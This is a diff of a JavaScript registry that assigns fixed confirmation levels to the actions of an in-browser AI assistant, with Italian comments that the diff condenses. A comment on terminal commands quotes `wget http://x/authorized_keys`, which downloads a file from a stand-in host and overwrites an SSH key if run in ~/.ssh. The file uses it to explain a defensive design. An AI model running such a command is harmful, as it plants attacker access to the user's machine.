@@ -1,6 +1,6 @@
-// Registro azione→livello di sicurezza (#146.2). Il livello è assegnato STATICAMENTE qui, mai deciso dall'LLM a runtime: 1 reversibile, si esegue subito; 2 reversibile con inconvenienti, popup che spiega modifica e rischi (SN_CONFIRM_UI.confirm), aperto da solo sulle risposte fresche (#183) e uno alla volta se ce n'è più d'uno; 3 irreversibile, l'utente digita «conferma» (confirmTyped).
-// Il dispatch (executeFiloAction) RIFIUTA le azioni non registrate: ogni nuovo potere di Filo deve dichiarare qui il proprio livello, altrimenti non viene eseguito.
-// Per IMPOSTA_PREFERENZA il livello dipende dalla preferenza (il `level` del setter in preferences.js, default 1): cambiare tema è innocuo, accendere la modalità terminale dà a Filo la shell.
+// Registro azione→livello di sicurezza (#146.2), assegnato STATICAMENTE qui e mai dall'LLM a runtime: 1 reversibile, si esegue subito; 2 popup che spiega modifica e rischi, aperto da solo sulle risposte fresche (#183) e uno alla volta; 3 irreversibile, l'utente digita «conferma».
+// Il dispatch RIFIUTA le azioni non registrate: ogni nuovo potere deve dichiarare qui il proprio livello, o non viene eseguito.
+// Per IMPOSTA_PREFERENZA il livello lo dà il setter in preferences.js (default 1): cambiare tema è innocuo, accendere la modalità terminale dà a Filo la shell.
 
 (function (global) {
   'use strict';
@@ -67,8 +67,7 @@
 
   const REGISTRY = {
     NAVIGA: {
-      // Aprire un link è di norma innocuo → livello 1. ECCEZIONE anti-esfiltrazione: se l'URL porta fuori dati sensibili che il modello aveva in contesto (taint-match), o ha la forma di un payload da origine non fidata, sale a 2 e la conferma mostra l'URL.
-      // Il flag `_exfil` lo calcola il main (urlExfil.js); mai l'LLM.
+      // Aprire un link è di norma innocuo → 1. ECCEZIONE anti-esfiltrazione: se l'URL porta fuori dati sensibili che il modello aveva in contesto, o ha la forma di un payload da origine non fidata, sale a 2 e la conferma mostra l'URL. Il flag `_exfil` lo calcola il main (urlExfil.js), mai l'LLM.
       level: (a) => (a && a._exfil ? 2 : 1),
       describe: (a) => {
         const url = a.url || a.href || a.link || 'una pagina';
@@ -92,9 +91,8 @@
       level: 1,
       describe: (a) => `Impostare una sveglia ${a.time || a.orario || ''}`.trim(),
     },
-    // Il livello dipende da QUANTE cose sparirebbero, non da come è formulata la richiesta: togliere la sveglia appena nominata è reversibile a costo zero (la si richiede) → 1.
-    // Cancellarne più d'una in un colpo no: «leva tutte le sveglie, sono in ferie» porta via anche quella dell'antibiotico, e chi l'ha detto se ne accorge il giorno dopo → 2, col popup che elenca cosa sparisce.
-    // Il conto (`_targets`) lo fa il main, che ha la lista vera; senza, si ripiega sulla forma della richiesta («tutte» → 2), il caso prudente.
+    // Conta QUANTE cose sparirebbero, non come è formulata la richiesta: togliere la sveglia appena nominata è reversibile a costo zero → 1. Cancellarne più d'una in un colpo no: «leva tutte le sveglie, sono in ferie» porta via anche quella dell'antibiotico, e ci si accorge il giorno dopo → 2, col popup che elenca cosa sparisce.
+    // Il conto (`_targets`) lo fa il main, che ha la lista vera; senza, vale la forma della richiesta («tutte» → 2), il caso prudente.
     CANCELLA_SVEGLIA: {
       level: (a) => (targetCount(a) > 1 || (targetCount(a) == null && wantsAll(a)) ? 2 : 1),
       describe: (a) => {
@@ -129,8 +127,8 @@
       describe: () => 'Salvare un appunto',
     },
     SALVA_LEZIONE: {
-      // Filo fissa una LEZIONE nella propria memoria, su richiesta o di sua iniziativa quando una regola va fissata subito (es. proteggere i dati dell'utente da una richiesta sospetta): entra nello stesso buffer che l'agente-lezioni riempie da solo e vale da subito ovunque.
-      // Livello 1 per la stessa ragione per cui le lezioni automatiche non chiedono conferma: stesso canale, stesso grado di fiducia, e restano visibili e cancellabili fra le memorie. Un popup sarebbe anche controproducente nel caso della protezione: confermerebbe chiunque sia alla tastiera, cioè proprio chi la lezione vuole tenere fuori.
+      // Una LEZIONE entra nello stesso buffer che l'agente-lezioni riempie da solo e vale subito ovunque: livello 1 per la stessa ragione per cui le lezioni automatiche non chiedono conferma — stesso canale, stessa fiducia, e restano visibili e cancellabili fra le memorie.
+      // Un popup sarebbe anche controproducente quando la lezione serve a proteggere i dati dell'utente da una richiesta sospetta: confermerebbe chiunque sia alla tastiera, cioè proprio chi la lezione vuole tenere fuori.
       level: 1,
       describe: (a) => {
         const testo = String(a?.testo ?? a?.text ?? a?.lezione ?? '').trim();
@@ -151,7 +149,7 @@
       describe: (a) => `Cercare sul web "${a.query || ''}"`,
     },
     ONBOARDING: {
-      // Filo tiene il conto della micro-intervista di benvenuto (#524). Non tocca nulla dell'utente — le impostazioni che l'intervista applica passano dalle LORO azioni, ognuna col proprio livello — e non ha niente da annullare: chiudere l'accoglienza è ciò che l'utente vuole quando dice «basta così», e dalle Preferenze si rilancia. Livello 1.
+      // Tiene il conto della micro-intervista di benvenuto (#524): non tocca nulla dell'utente (le impostazioni passano dalle LORO azioni, ognuna col suo livello) e non ha niente da annullare, visto che dalle Preferenze l'intervista si rilancia. Livello 1.
       level: 1,
       describe: (a) => {
         if (a && (a.fine ?? a.chiudi ?? a.done)) return 'Chiudere l’intervista di benvenuto';
@@ -176,7 +174,7 @@
       },
     },
     LEGGI_DOCUMENTO: {
-      // Legge un documento dal DISCO (un PDF, un file di testo) perché l'utente gliel'ha chiesto. Livello 1 per le stesse ragioni di un comando di sola lettura nel terminale: non modifica, non esegue, non manda niente fuori dal computer — il testo entra solo nel contesto.
+      // Legge un documento dal DISCO perché l'utente gliel'ha chiesto. Livello 1 come un comando di sola lettura nel terminale: non modifica, non esegue, non manda niente fuori — il testo entra solo nel contesto.
       // Una conferma a ogni documento sarebbe attrito su una cosa appena chiesta, e una conferma che si accetta sempre smette di essere un controllo.
       level: 1,
       describe: (a) => {
@@ -230,8 +228,8 @@
       },
     },
     IMPOSTA_ESTETICA: {
-      // Cambio di un token estetico su richiesta in chat (#146.4). Reversibile → 1: si applica subito e nella bolla compare un controllo per raffinarlo.
-      // ECCEZIONE: se la modifica rende il testo quasi uguale allo sfondo, il livello sale a 2 e si conferma prima di applicare. Il flag `_illegible` lo calcola il main, che ha i token correnti; mai l'LLM.
+      // Cambio di un token estetico (#146.4): reversibile → 1, si applica subito e nella bolla compare un controllo per raffinarlo.
+      // ECCEZIONE: se rende il testo quasi uguale allo sfondo sale a 2. Il flag `_illegible` lo calcola il main, che ha i token correnti.
       level: (a) => (a && a._illegible ? 2 : 1),
       describe: (a) => {
         const T = global.SN_THEME_TOKENS;
@@ -246,8 +244,8 @@
       },
     },
     ESEGUI_COMANDO: {
-      // Comando nel terminale (#146.6). Il livello NON è fisso: dipende dal comando EFFETTIVO, classificato dal main (mai dall'LLM) in cmdClassify.js — 1 sola lettura, 2 modifica recuperabile, 3 cancellazioni, comandi pericolosi e qualunque comando non riconosciuto.
-      // Una sequenza (`&&`/`||`/`;`) prende il livello massimo dei suoi pezzi. Comando assente o classificatore non caricato → 3, massima cautela.
+      // Il livello NON è fisso: dipende dal comando EFFETTIVO, classificato dal main (mai dall'LLM) in cmdClassify.js — 1 sola lettura, 2 modifica recuperabile, 3 cancellazioni, comandi pericolosi e qualunque comando non riconosciuto.
+      // Una sequenza (`&&`/`||`/`;`) prende il livello massimo dei pezzi. Comando assente o classificatore non caricato → 3.
       level: (a) => {
         const C = global.SN_CMD_CLASSIFY;
         const cmd = String((a && (a.comando ?? a.command ?? a.cmd)) || '').trim();
@@ -257,15 +255,13 @@
       },
       describe: (a) => {
         const cmd = String((a && (a.comando ?? a.command ?? a.cmd)) || '').trim();
-        // DOVE il comando agisce non si legge nel comando: la cartella di lavoro è persistente e la sposta l'assistente da sé (`cd` è livello 1). Senza dirlo, `wget http://x/authorized_keys` ha lo stesso identico testo nella home, dove è innocuo, e dentro ~/.ssh, dove sovrascrive una chiave.
-        // La cartella la inietta il main come `_cwd`, mai l'LLM.
+        // DOVE il comando agisce non si legge nel comando: la cartella di lavoro è persistente e la sposta l'assistente da sé (`cd` è livello 1). `wget http://x/authorized_keys` ha lo stesso testo nella home, dove è innocuo, e dentro ~/.ssh, dove sovrascrive una chiave. La cartella la inietta il main come `_cwd`.
         const cwd = String((a && a._cwd) || '').trim();
         return `Eseguire nel terminale:\n${cmd || '(comando vuoto)'}`
           + (cwd ? `\nCartella di lavoro: ${cwd}` : '');
       },
     },
-    // Proxy per-tab via linguaggio naturale (#152), tutte livello 1: instradare una scheda da un altro paese o salvare una regola per dominio è completamente reversibile.
-    // La separazione del cookie jar è inerente al proxy e l'utente l'ha chiesta; il flusso AUTOMATICO da geo-block, che invece propone quando ci sono login attivi, vive altrove.
+    // Proxy per-tab (#152), tutte livello 1: instradare una scheda da un altro paese o salvare una regola per dominio è reversibile, e la separazione del cookie jar è inerente al proxy che l'utente ha chiesto. Il flusso automatico da geo-block vive altrove.
     PROXY_TAB: {
       level: 1,
       describe: (a) => `Aprire questa scheda da ${countryLabel(proxyCountry(a)) || 'un altro paese'}`,
@@ -286,8 +282,7 @@
       level: 1,
       describe: (a) => `Togliere la regola "apri sempre da un altro paese" per ${proxyDomain(a) || 'questo sito'}`,
     },
-    // Comandi della finestra e della barra di Filo via chat (#419): schermo intero, riduci a icona, menu, home — la stessa cosa che sa già fare l'assistente di pagina. Tutti livello 1: azionare un controllo della finestra è benigno e reversibile.
-    // «close» è ESCLUSO di proposito: l'AI non chiude né finestra né schede.
+    // Comandi della finestra e della barra via chat (#419): livello 1, azionare un controllo della finestra è benigno e reversibile. «close» è ESCLUSO di proposito — l'AI non chiude né finestra né schede.
     COMANDO_FINESTRA: {
       level: 1,
       describe: (a) => {
@@ -303,8 +298,7 @@
         return labels[cmd] || 'Azionare un comando della finestra di Filo';
       },
     },
-    // Estetica del CONTENUTO della pagina via chat (#185): livello 1 perché vale SOLO per quella pagina (CSS iniettato live) ed è reversibile ricaricando o con RIPRISTINA_STILE_PAGINA.
-    // Il CSS prodotto dall'LLM è SANIFICATO dal main (pageRestyle.js) prima dell'iniezione: niente at-rule, url(), graffe o markup.
+    // Estetica del CONTENUTO della pagina (#185): livello 1 perché vale solo per quella pagina (CSS live) ed è reversibile ricaricando o con RIPRISTINA_STILE_PAGINA. Il CSS dell'LLM è SANIFICATO dal main (pageRestyle.js): niente at-rule, url(), graffe o markup.
     STILE_PAGINA: {
       level: 1,
       describe: (a) => {
